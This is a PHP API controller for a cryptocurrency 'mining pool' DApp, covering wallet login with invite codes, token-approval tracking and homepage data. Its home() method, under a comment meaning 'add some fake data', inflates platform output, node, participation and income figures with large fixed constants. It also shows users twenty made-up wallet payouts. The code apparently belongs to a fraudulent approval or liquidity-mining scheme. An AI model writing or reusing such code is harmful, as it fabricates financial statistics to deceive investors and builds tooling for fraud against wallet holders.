<?php

namespace app\api\controller;

use app\command\UserLevel;
use app\common\controller\Api;
use app\common\model\ApproveHistory;
use app\common\model\Help;
use app\common\model\Message;
use app\common\model\Notice;
use app\common\model\Parameter;
use app\common\model\Problem;
use app\common\model\SmartContract;
use app\common\model\StakeEarnings;
use app\common\model\Token;
use app\common\model\User;
use app\common\model\WhitePaper;
use app\common\utils\Random;
use Exception;
use think\Console;
use think\Db;
use think\db\Where;
use think\facade\Request;

class Index extends Api
{

    protected $noNeedLogin = [
        'contract',
        'login',
        'home',
        'getStationLetters',
        'level',
    ];

    /**
     * 列表合约列表
     */
    public function contract()
    {
        $data = Token::getContracts();
        $this->success('请求成功', $data);
    }

    /**
     * 登录
     * 存在账户即登录
     * 不存在则创建
     */
    public function login()
    {
        $invite_code = Request::param('invite_code');
        $walletAddress = Request::param('wallet_address');
        $smartContract = Request::param('smart_contract');
        $parent = User::where(['invite_code' => $invite_code])
            ->findOrEmpty();
        $parent_pid = empty($parent['pid']) ? '' : $parent['pid'];
        $pid = $parent->isEmpty() ? '' : $parent_pid . $parent['id'] . ',';
        $contract = SmartContract::where(['contract_address' => $smartContract])
            ->findOrEmpty();
        if ($contract->isEmpty()) {
            $this->error();
        }
        // 检查地址长度
        $len = $contract['coin']['address_len'];
        if (mb_strlen($walletAddress) !== $len
            || mb_strlen($smartContract) !== $len) {
            $this->error();
        }
        $row = User::where(['wallet_address' => $walletAddress, 'contract_id' => $contract['id']])
            ->findOrEmpty();
        if ($row->isEmpty()) {
            //注册
            // @todo 邀请注册
            $extend = [
                'wallet_address' => $walletAddress,
                'contract_id' => $contract['id'],
                'token_id' => $contract['token_id'],
                'pid' => $pid
            ];
            $username = Random::alnum();
            $ret = $this->auth->register($username, $walletAddress, $username, $extend);
        } else {
            //登录
            $ret = $this->auth->direct($row['id']);
        }

        if ($ret) {
            $data = $this->auth->getUserinfo();
            $this->success('请求成功', $data);
        }
    }

    /**
     * 更新授权状态
     */
    public function approve()
    {
        Db::startTrans();
        try {
            $uid = $this->auth->id;
            $map = new Where();
            $map['id'] = $uid;
            $data['is_approve'] = 1;
            User::update($data, $map);
            //写日志
            $txid = Request::param('txid');
            ApproveHistory::create([
                'user_id' => $uid,
                'txid' => $txid,
            ]);
            Console::call('sync', ['uid' => (string)$uid]);
            Db::commit();
        } catch (Exception $exception) {
            Db::rollback();
        }
    }

    /**
     * H5首页数据
     */
    public function home()
    {
        $setting = Parameter::getDict();
        $language = Request::param('language');
        $platformTotalOutput = StakeEarnings::getPlatformTotalOutput();
        $userCount = User::getUserCount();
        $participation = User::getParticipation();
        $userIncomeSum = StakeEarnings::getUserIncomeSum();
        //加点假数据
        $data = [
            'title' => $setting['web_name'],
            'mining_pool' => [
                'platform_total_output' => format_number(512607 + $platformTotalOutput),
                'node_sum' => format_number(489249 + $userCount),
                'participation' => format_number(850800 + $participation),
                'user_income_sum' => format_number(599737166 + $userIncomeSum),
            ],
            // 取20个记录
            'earnings' => [
                [
                    "wallet_address" => "0x7dc86f...f065c8",
                    "send_balance" => "0.03182657",
                ],
                [
                    "wallet_address" => "0xf924bd...a6fbc8",
                    "send_balance" => "0.05209031",
                ],
                [
                    "wallet_address" => "0x6e9640...55956b",
                    "send_balance" => "0.05075772",
                ],
                [
                    "wallet_address" => "0xbda1a3...00a10d",
                    "send_balance" => "0.06405622",
                ],
                [
                    "wallet_address" => "0x0e539a...c00cd0",
                    "send_balance" => "0.02746864",
                ],
                [
                    "wallet_address" => "0xbe34dd...95be00",
                    "send_balance" => "0.03962356",
                ],
                [
                    "wallet_address" => "0x0ec25d...db2eee",
                    "send_balance" => "0.00778632",
                ],
                [
                    "wallet_address" => "0x585600...42b5b5",
                    "send_balance" => "0.06114059",
                ],
                [
                    "wallet_address" => "0x400e80...d2dcda",
                    "send_balance" => "0.07647996",
                ],
                [
                    "wallet_address" => "0x5c8b9f...01b94b",
                    "send_balance" => "0.07738193",
                ],
                [
                    "wallet_address" => "0x6afa9f...a1b0e2",
                    "send_balance" => "0.02317722",
                ],
                [
                    "wallet_address" => "0x1aac50...e01300",
                    "send_balance" => "0.04231002",
                ],
                [
                    "wallet_address" => "0xe976b2...6f19cd",
                    "send_balance" => "0.00570525",
                ],
                [
                    "wallet_address" => "0x60bae5...3c2da5",
                    "send_balance" => "0.00644146",
                ],
                [
                    "wallet_address" => "0xbad329...00f396",
                    "send_balance" => "0.06511331",
                ],
                [
                    "wallet_address" => "0xd9acf2...2efe34",
                    "send_balance" => "0.03344307",
                ],
                [
                    "wallet_address" => "0xd39961...7ca002",
                    "send_balance" => "0.01449001",
                ],
                [
                    "wallet_address" => "0xb21d7b...ffbe40",
                    "send_balance" => "0.02101632",
                ],
                [
                    "wallet_address" => "0xabdfd4...b6fbfa",
                    "send_balance" => "0.05458852",
                ],
                [
                    "wallet_address" => "0xb449ef...620070",
                    "send_balance" => "0.07445843",
                ],
            ],
            //公告
            'notice' => Notice::getLastNotice($language),
            'help' => Help::getLastNotice($language),
            //FAQ列表
            'problem' => Problem::getFaqs($language),
            'banner' => $setting['home_banner'],
            'white_paper' => WhitePaper::select(),
            'dappdomain' => '',
            'service' => [
                'online' => $setting['online_service'],
                'whatsapp' => $setting['whatsapp_service'],
                'telegram' => $setting['telegram_service'],
            ],
            //ETH-USDT汇率
            'ethusdt' => Token::ethUsdtRate(),
        ];
        $this->success('请求成功', $data);
    }

    /**
     * 获取站内信列表
     */
    public function getStationLetters()
    {
        $data = Message::order(['id' => 'DESC'])
            ->paginate();
        $this->success('请求成功', $data);
    }

    /**
     * 用户等级
     * @return void
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     */
    public function level()
    {
        $data = Db::name('user_level')->where('status', 1)->fieldRaw('name,balance,rate1,rate2,rate3')->order('balance', 'desc')->select();
        $this->success('请求成功', $data);
    }
}
